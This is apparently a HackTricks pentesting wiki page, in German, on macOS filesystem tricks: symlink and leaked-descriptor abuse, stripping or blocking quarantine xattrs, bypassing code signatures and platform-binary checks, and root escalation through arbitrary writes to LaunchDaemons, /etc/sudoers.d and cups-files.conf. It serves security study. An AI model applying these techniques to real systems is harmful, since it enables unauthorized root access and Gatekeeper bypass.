# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Kombinationen von POSIX-Berechtigungen

Berechtigungen in einem **Verzeichnis**:

- **read** - du kannst die Einträge des Verzeichnisses **enumerate**
- **write** - du kannst **Dateien** im Verzeichnis **löschen/schreiben** und **leere Ordner löschen**.
- Du kannst jedoch **nicht nicht-leere Ordner löschen/verändern**, sofern du keine Schreibberechtigungen für sie besitzt.
- Du kannst den **Namen eines Ordners nicht ändern**, sofern er nicht dir gehört.
- **execute** - du darfst das Verzeichnis **durchlaufen** - wenn du dieses Recht nicht besitzt, kannst du auf keine Dateien darin oder in Unterverzeichnissen zugreifen.

### Gefährliche Kombinationen

**So überschreibst du eine Datei/einen Ordner im Besitz von root**, wenn:

- Ein übergeordnetes **Verzeichnis im Pfad** dem Benutzer gehört
- Ein übergeordnetes **Verzeichnis im Pfad** einer **Benutzergruppe** gehört, die **Schreibzugriff** besitzt
- Eine **Benutzergruppe** **Schreibzugriff** auf die **Datei** besitzt

Bei jeder der vorherigen Kombinationen könnte ein Angreifer einen **sym/hard link** in den erwarteten Pfad **injecten**, um einen privilegierten arbitrary write zu erhalten.

### Sonderfall: Ordner root mit R+X

Wenn sich Dateien in einem **Verzeichnis** befinden, auf das **nur root R+X-Zugriff** hat, sind diese für niemand anderen **zugänglich**. Eine Schwachstelle, die es ermöglicht, eine für einen Benutzer lesbare Datei, die aufgrund dieser **Einschränkung** nicht gelesen werden kann, aus diesem Ordner **in einen anderen Ordner zu verschieben**, könnte daher ausgenutzt werden, um diese Dateien zu lesen.

Beispiel unter: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Freizügige Datei/Ordner

Wenn ein privilegierter Prozess Daten in eine **Datei** schreibt, die von einem **Benutzer mit niedrigeren Berechtigungen kontrolliert** oder zuvor von einem solchen Benutzer **erstellt** werden konnte, kann der Benutzer die Datei einfach über einen Symbolic oder Hard Link auf eine andere **Datei verweisen**, und der privilegierte Prozess schreibt in diese Datei.

Siehe die anderen Abschnitte, in denen ein Angreifer einen **arbitrary write ausnutzen könnte, um Berechtigungen zu erweitern**.

### Open `O_NOFOLLOW`

Laut [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Es wird nur die **letzte** Komponente geprüft — jede **mittlere** Komponente wird weiterhin aufgelöst und verfolgt. Ein Entwickler, der einen Schreibvorgang mit `O_NOFOLLOW` „geschützt“ hat, kann daher weiterhin angegriffen werden, indem ein Symlink in einem beliebigen **übergeordneten Verzeichnis** des Zielpfads platziert wird.

Dieselbe Manpage dokumentiert die Flags, die diese Lücke tatsächlich schließen:

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

Andernfalls sind `openat()` relativ zu einem bereits validierten Verzeichnis-FD oder `realpath()` + erneute Validierung die verbleibenden Möglichkeiten, um Symlink-Swaps innerhalb des Pfads zu verhindern.

## .fileloc

Dateien mit der Erweiterung **`.fileloc`** können auf andere Anwendungen oder Binaries verweisen, sodass beim Öffnen die entsprechende Anwendung/das entsprechende Binary ausgeführt wird.\
Beispiel:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

Wenn ein Aufruf von `open` nicht über das Flag `O_CLOEXEC` verfügt, wird der File Descriptor an den Child-Prozess vererbt. Wenn also ein privilegierter Prozess eine privilegierte Datei öffnet und einen vom Angreifer kontrollierten Prozess ausführt, **erbt der Angreifer den FD für die privilegierte Datei**.

Das kanonische Beispiel ist die **`DYLD_PRINT_TO_FILE` LPE in OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):

- `dyld` berücksichtigte `DYLD_PRINT_TO_FILE=/path` sogar in **restricted (suid root) binaries**, weil diese Variable außerhalb von `processDyldEnvironmentVariable()` geparst wurde.
- Es führte `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` aus und **erstellte dadurch eine root-owned Datei an einem beliebigen Pfad**.
- Der FD wurde **nie geschlossen und hatte kein close-on-exec-Flag**, sodass jeder Child-Prozess des suid-Binaries einen **beschreibbaren FD für eine root-owned Datei** erbte.
- Wenn man beispielsweise `DYLD_PRINT_TO_FILE=/etc/target suid_binary` ausführte und anschließend die Nummer des geerbten FDs im Child-Prozess auslas, waren beliebige Schreibvorgänge in root-owned Dateien möglich; `fcntl(fd, F_SETFL, 0)` entfernte sogar `O_APPEND`, sodass Überschreiben statt Anhängen möglich war.

Dasselbe Muster tritt immer dann auf, wenn ein privilegierter Prozess eine Datei **vor** dem `exec` eines von dir kontrollierten Prozesses öffnet (Helper-Tools, über `$EDITOR` aufgerufene `crontab`-artige Editoren, Log-/Debug-Dateien, die über einen Pfad aus einer Env-Variable geöffnet werden ...). Liste die geerbten FDs mit folgendem Befehl auf:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Alles über `2`, das auf eine Datei verweist, die Sie nicht selbst öffnen können, ist eine arbitrary-write- (oder arbitrary-read-) primitive.

## Tricks mit quarantine xattrs vermeiden

### Entfernen
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Wenn eine Datei/ein Ordner dieses unveränderliche Attribut hat, ist es nicht möglich, ein xattr darauf zu setzen
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Dateisysteme ohne xattr-Unterstützung

Nicht jedes Dateisystem, das macOS mounten kann, speichert **erweiterte Attribute** nativ. HFS+ und APFS tun dies; **FAT32, exFAT und (die meisten) NFS-Mounts nicht** — macOS emuliert sie, indem eine **AppleDouble**-Seitendatei namens `._<filename>` geschrieben wird ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).

Das ist für die Quarantäne relevant, da das xattr nur dann erhalten bleibt, wenn es tatsächlich auf dasselbe Volume geschrieben **und von dort wieder gelesen** werden kann:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Wenn das Volume später über einen Pfad gelesen wird, der das `._`-Pendant ignoriert (oder das Pendant entfernt/gelöscht wurde), gelangt die Datei **ohne Quarantäne-Flag** an — und eine nicht unter Quarantäne stehende `.app` reicht aus, um die App Sandbox zu umgehen, wie in [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) beschrieben.

### writeextattr ACL

Diese ACL verhindert das Hinzufügen von `xattrs` zur Datei
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Das **AppleDouble** file format kopiert eine Datei einschließlich ihrer ACEs.

Im [**Quellcode**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) ist zu sehen, dass die im xattr namens **`com.apple.acl.text`** gespeicherte ACL-Textdarstellung als ACL in der dekomprimierten Datei festgelegt wird. Wenn man also eine Anwendung mit dem **AppleDouble** file format und einer ACL, die verhindert, dass andere xattrs in die Datei geschrieben werden, in eine ZIP-Datei komprimiert, wurde das Quarantine-xattr nicht in die Anwendung gesetzt:

Siehe den [**Originalbericht**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) für weitere Informationen.

Um dies zu reproduzieren, müssen wir zunächst den korrekten ACL-String ermitteln:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Beachte, dass die Sandbox, selbst wenn dies funktioniert, zuvor das Quarantine-xattr schreibt.)

Nicht wirklich erforderlich, aber ich lasse es für alle Fälle hier:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass von Signaturprüfungen

### Bypass der Prüfungen auf platform binaries

Einige Sicherheitsprüfungen überprüfen, ob es sich bei der Binary um eine **platform binary** handelt, beispielsweise um eine Verbindung zu einem XPC service zu erlauben. Wie jedoch in https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ zum Thema bypass gezeigt wird, ist es möglich, diese Prüfung zu umgehen, indem man eine platform binary (wie /bin/ls) verwendet und den Exploit über dyld mithilfe der Umgebungsvariable `DYLD_INSERT_LIBRARIES` injiziert.

### Bypass der Flags `CS_REQUIRE_LV` und `CS_FORCED_LV`

Eine ausführende Binary kann ihre eigenen Flags ändern, um Prüfungen mit Code wie dem folgenden zu umgehen:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code Signatures umgehen

Bundles enthalten die Datei **`_CodeSignature/CodeResources`**, die den **Hash** jeder einzelnen **Datei** im **Bundle** enthält. Beachte, dass der Hash von CodeResources ebenfalls **in der ausführbaren Datei eingebettet** ist, daher können wir auch diese Datei nicht manipulieren.

Es gibt jedoch einige Dateien, deren Signatur nicht überprüft wird. Diese enthalten den Schlüssel `omit` in der plist, zum Beispiel:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Es ist möglich, die Signatur einer Ressource über die CLI zu berechnen mit:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## DMGs mounten

Ein Benutzer kann ein benutzerdefiniertes DMG mounten, das sogar über einigen vorhandenen Ordnern erstellt wurde. So könntest du ein benutzerdefiniertes DMG-Paket mit benutzerdefinierten Inhalten erstellen:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Normalerweise mountet macOS Datenträger über den Mach-Dienst `com.apple.DiskArbitrarion.diskarbitrariond` (bereitgestellt von `/usr/libexec/diskarbitrationd`). Wenn der Parameter `-d` zur LaunchDaemons-plist-Datei hinzugefügt und der Dienst neu gestartet wird, werden die Logs in `/var/log/diskarbitrationd.log` gespeichert.\
Allerdings ist es möglich, Tools wie `hdik` und `hdiutil` zu verwenden, um direkt mit dem kext `com.apple.driver.DiskImages` zu kommunizieren.

## Beliebige Schreibvorgänge

### Periodische sh-Skripte

Wenn dein Skript als **shell script** interpretiert werden könnte, könntest du das **`/etc/periodic/daily/999.local`**-shell script überschreiben, das jeden Tag ausgeführt wird.

Du kannst eine **Ausführung** dieses Skripts simulieren mit: **`sudo periodic daily`**

### Daemons

Schreibe einen beliebigen **LaunchDaemon** wie **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** mit einer plist, die ein beliebiges Skript ausführt, wie etwa:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Erstelle einfach das Skript `/Applications/Scripts/privesc.sh` mit den **Befehlen**, die du als root ausführen möchtest.

### Sudoers File

Wenn du über **arbitrary write** verfügst, könntest du eine Datei im Ordner **`/etc/sudoers.d/`** erstellen, die dir **sudo**-Berechtigungen gewährt.

### PATH files

Die Datei **`/etc/paths`** ist einer der wichtigsten Orte, an denen die PATH-Umgebungsvariable festgelegt wird. Du musst root sein, um sie zu überschreiben. Wenn jedoch ein Skript aus einem **privileged process** einen **Befehl ohne vollständigen Pfad** ausführt, kannst du ihn möglicherweise **hijacken**, indem du diese Datei änderst.

Du kannst auch Dateien in **`/etc/paths.d`** schreiben, um neue Ordner in die PATH-Umgebungsvariable zu laden.

### cups-files.conf

Diese Technik wurde in [diesem writeup](https://www.kandji.io/blog/macos-audit-story-part1) verwendet.

Erstelle die Datei `/etc/cups/cups-files.conf` mit folgendem Inhalt:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Dadurch wird die Datei `/etc/sudoers.d/lpe` mit den Berechtigungen 777 erstellt. Der zusätzliche Müll am Ende dient dazu, die Erstellung des Fehlerprotokolls auszulösen.

Schreibe anschließend in `/etc/sudoers.d/lpe` die benötigte Konfiguration, um die Privilegien zu eskalieren, beispielsweise `%staff ALL=(ALL) NOPASSWD:ALL`.

Ändere danach die Datei `/etc/cups/cups-files.conf` erneut und setze `LogFilePerm 700`, damit die neue sudoers-Datei durch den Aufruf von `cupsctl` gültig wird.

### Sandbox Escape

Es ist möglich, die macOS-Sandbox mit einem beliebigen FS-Schreibzugriff zu umgehen. Beispiele findest du auf der Seite [macOS Auto Start](../../../../macos-auto-start-locations.md). Eine verbreitete Methode besteht darin, eine Terminal-Einstellungsdatei in `~/Library/Preferences/com.apple.Terminal.plist` zu schreiben, die beim Start einen Befehl ausführt, und sie mit `open` aufzurufen.

## Generating writable files as other users

Ein sehr verbreiteter Privesc-Primitiv besteht darin, dass ein **privilegierter Prozess eine Datei für dich** in einem von dir kontrollierten Verzeichnis erstellt und du anschließend **Schreibzugriff** auf diese Datei behältst. Dafür sind zwei Voraussetzungen erforderlich:

1. Ein Verzeichnis, das dir gehört (oder in dem du eine **vererbbare ACL** setzen kannst), sodass alles, was darin erstellt wird, deine Berechtigungen erbt.
2. Ein privilegierter/`suid`-Prozess, dem mitgeteilt werden kann, **wo** eine Datei erstellt werden soll — typischerweise über eine Debug-/Logging-Umgebungsvariable, eine Konfigurationsdatei oder die XPC-API eines Helpers.

Der Teil mit der **vererbbaren ACL** sorgt dafür, dass die erstellte Datei von dir beschreibbar ist, obwohl sie einem anderen Benutzer gehört. Die Vererbungsflags `file_inherit` / `directory_inherit` sind in [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) dokumentiert:
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Jetzt ist jede Datei, die ein privilegierter Prozess innerhalb von `$DIRNAME` erstellt, **für dich beschreibbar**. Wenn dieses Verzeichnis außerdem ein Ort ist, der später **als root ausgeführt** wird (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, ein LaunchDaemon-Verzeichnis ...), führt dies direkt zu einer root-Eskalation. In den Abschnitten [Sudoers File](#sudoers-file) und [cups-files.conf](#cups-filesconf) weiter oben findest du Informationen dazu, was du schreiben kannst, sobald du die Datei hast.

Ein vollständiges Beispiel für die Kette „eine Umgebungsvariable veranlasst einen root-Prozess, eine Datei zu erstellen, und der FD wird an dich weitergegeben“ findest du weiter oben unter [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec).

## POSIX Shared Memory

**POSIX shared memory** ermöglicht es Prozessen in POSIX-kompatiblen Betriebssystemen, auf einen gemeinsamen Speicherbereich zuzugreifen, wodurch im Vergleich zu anderen Methoden der Interprozesskommunikation eine schnellere Kommunikation ermöglicht wird. Dabei wird mit `shm_open()` ein Shared-Memory-Objekt erstellt oder geöffnet, seine Größe mit `ftruncate()` festgelegt und es mithilfe von `mmap()` in den Adressraum des Prozesses eingebunden. Prozesse können dann direkt aus diesem Speicherbereich lesen und in ihn schreiben. Um den gleichzeitigen Zugriff zu verwalten und Datenbeschädigungen zu verhindern, werden häufig Synchronisationsmechanismen wie Mutexes oder Semaphoren verwendet. Schließlich heben die Prozesse die Zuordnung des Shared Memory auf und schließen es mit `munmap()` und `close()`; optional kann das Speicherobjekt mit `shm_unlink()` entfernt werden. Dieses System eignet sich besonders für effiziente und schnelle IPC-Operationen in Umgebungen, in denen mehrere Prozesse schnell auf gemeinsam genutzte Daten zugreifen müssen.

<details>

<summary>Producer-Codebeispiel</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Beispiel für Consumer-Code</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** sind eine in macOS eingeführte Sicherheitsfunktion, die die Sicherheit und Zuverlässigkeit von **file descriptor operations** in Benutzeranwendungen verbessert. Diese guarded descriptors bieten eine Möglichkeit, bestimmte Einschränkungen oder „guards“ mit file descriptors zu verknüpfen, die vom Kernel durchgesetzt werden.

Diese Funktion ist besonders nützlich, um bestimmte Klassen von Sicherheitslücken wie **unautorisierten Dateizugriff** oder **race conditions** zu verhindern. Diese Sicherheitslücken treten beispielsweise auf, wenn ein Thread auf eine file description zugreift und dadurch **einem anderen verwundbaren Thread Zugriff darauf gewährt**, oder wenn ein file descriptor von einem verwundbaren Kindprozess **geerbt** wird. Einige Funktionen im Zusammenhang mit dieser Funktionalität sind:

- `guarded_open_np`: Öffnet einen FD mit einem guard
- `guarded_close_np`: Schließt ihn
- `change_fdguard_np`: Ändert guard flags eines Descriptors (und kann sogar den guard-Schutz entfernen)

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (ACL inheritance flags)
- [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
